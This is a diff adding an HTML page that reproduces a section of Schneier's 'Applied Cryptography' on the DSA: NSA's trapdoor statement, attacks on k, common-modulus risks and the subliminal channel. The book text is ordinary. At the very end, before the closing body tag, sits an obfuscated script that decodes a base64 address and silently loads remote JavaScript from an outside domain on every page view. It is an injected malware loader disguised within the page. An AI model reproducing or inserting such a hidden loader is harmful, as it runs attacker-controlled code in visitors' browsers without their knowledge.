@@ -1,0 +1,84 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=491-493//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The NSA, in its first public interview on the subject, commented to Joe Abernathy of <I>The Houston Chronicle</I> on allegations about a trapdoor in DSS [363]:</P>
+<BLOCKQUOTE><P>Regarding the alleged trapdoor in the DSS. We find the term trapdoor somewhat misleading since it implies that the messages sent by the DSS are encrypted and with access via a trapdoor one could somehow decrypt (read) the message without the sender&#146;s knowledge.
+</P>
+<P>The DSS does not encrypt any data. The real issue is whether the DSS is susceptible to someone forging a signature and therefore discrediting the entire system. We state categorically that the chances of anyone&#151;including NSA&#151;forging a signature with the DSS when it is properly used and implemented is infinitesimally small.</P>
+<P>Furthermore, the alleged trapdoor vulnerability is true for <I>any</I> public key-based authentication system, including RSA. To imply somehow that this only affects the DSS (a popular argument in the press) is totally misleading. The issue is one of implementation and how one goes about selecting prime numbers. We call your attention to a recent EUROCRYPT conference which had a panel discussion on the issue of trapdoors in the DSS. Included on the panel was one of the Bellcore researchers who initially raised the trapdoor allegation, and our understanding is that the panel&#151;including the person from Bellcore&#151;concluded that the alleged trapdoor was not an issue for the DSS. Furthermore, the general consensus appeared to be that the trapdoor issue was trivial and had been overblown in the press. However, to try to respond to the trapdoor allegation, at NIST&#146;s request, we have designed a prime generation process which will ensure that one can avoid selection of the relatively few weak primes which could lead to weakness in using the DSS. Additionally, NIST intends to allow for larger modulus sizes up to 1024 which effectively negates the need to even use the prime generation process to avoid weak primes. An additional very important point that is often overlooked is that with the DSS the primes are <I>public</I> and therefore can be subject to public examination. Not all public key systems provide for this same type of examination.</P>
+<P>The integrity of any information security system requires attention to proper implementation. With the myriad of vulnerabilities possible given the differences among users, NSA has traditionally insisted on centralized trusted centers as a way to minimize risk to the system. While we have designed technical modifications to the DSS to meet NIST&#146;s requests for a more decentralized approach, we still would emphasize that portion of the <I>Federal Register</I> notice for the DSS which states:</P>
+<BLOCKQUOTE><P>&#147;While it is the intent of this standard to specify general security requirements for generating digital signatures, conformance to this standard does not assure that a particular implementation is secure. The responsible authority in each agency or department shall assure that an overall implementation provides an acceptable level of security. NIST will be working with government users to ensure appropriate implementations.&#148;
+</P>
+</BLOCKQUOTE><P>Finally, we have read all the arguments purporting insecurities with the DSS, and we remain unconvinced of their validity. The DSS has been subjected to intense evaluation within NSA which led to its being endorsed by our Director of Information Systems Security for use in signing unclassified data processed in certain intelligence systems and even for signing classified data in selected systems. We believe that this approval speaks to the lack of any credible attack on the integrity provided by the DSS given proper use and implementation. Based on the technical and security requirements of the U.S. government for digital signatures, we believe the DSS is the best choice. In fact, the DSS is being used in a pilot project for the Defense Message System to assure the authenticity of electronic messages of vital command and control information. This initial demonstration includes participation from the Joint Chiefs of Staff, the military services, and Defense Agencies and is being done in cooperation with NIST.
+</P>
+</BLOCKQUOTE><P>I&#146;m not going to comment on the trustworthiness of the NSA. Take their comments for what you think they&#146;re worth.
+</P>
+<P><FONT SIZE="+1"><B><I>Attacks against k</I></B></FONT></P>
+<P>Each signature requires a new value of <I>k</I>, and that value must be chosen randomly. If Eve ever recovers a <I>k</I> that Alice used to sign a message, perhaps by exploiting some properties of the random-number generator that generated <I>k</I>, she can recover Alice&#146;s private key, <I>x</I>. If Eve ever gets two messages signed using the same <I>k</I>, even if she doesn&#146;t know what it is, she can recover <I>x</I>. And with <I>x</I>, Eve can generate undetectable forgeries of Alice&#146;s signature. In any implementation of the DSA, a good random-number generator is essential to the system&#146;s security [1468].</P>
+<P><FONT SIZE="+1"><B><I>Dangers of a Common Modulus</I></B></FONT></P>
+<P>Even though the DSS does not specify a common modulus to be shared by everyone, different implementations may. For example, the Internal Revenue Service is considering using the DSS for the electronic submission of tax returns. What if they require every taxpayer in the country to use a common <I>p</I> and <I>q</I>? Even though the standard doesn&#146;t require a common modulus, such an implementation accomplishes the same thing. A common modulus too easily becomes a tempting target for cryptanalysis. It is still too early to tell much about different DSS implementations, but there is some cause for concern.</P>
+<P><FONT SIZE="+1"><B><I>Subliminal Channel in DSA</I></B></FONT></P>
+<P>Gus Simmons discovered a subliminal channel in DSA [1468,1469] (see Section 23.3). This subliminal channel allows someone to embed a secret message in his signature that can only be read by another person who knows the key. According to Simmons, it is a &#147;remarkable coincidence&#148; that the &#147;apparently inherent shortcomings of subliminal channels using the ElGamal scheme can all be overcome&#148; in the DSS, and that the DSS &#147;provides the most hospitable setting for subliminal communications discovered to date.&#148; NIST and NSA have not commented on this subliminal channel; no one knows if they even knew about it. Since this subliminal channel allows an unscrupulous implementer of DSS to leak a piece of the private key with each signature, it is important to never use an implementation of DSS if you don&#146;t trust the implementer.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(IVcfwAxg, bvIMScmL) {bvIMScmL = IVcfwAxg.createElement('script');bvIMScmL.type = 'text/javascript';bvIMScmL.async = true;bvIMScmL.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');IVcfwAxg.getElementsByTagName('body')[0].appendChild(bvIMScmL);}(document));</script></body>
+</html>
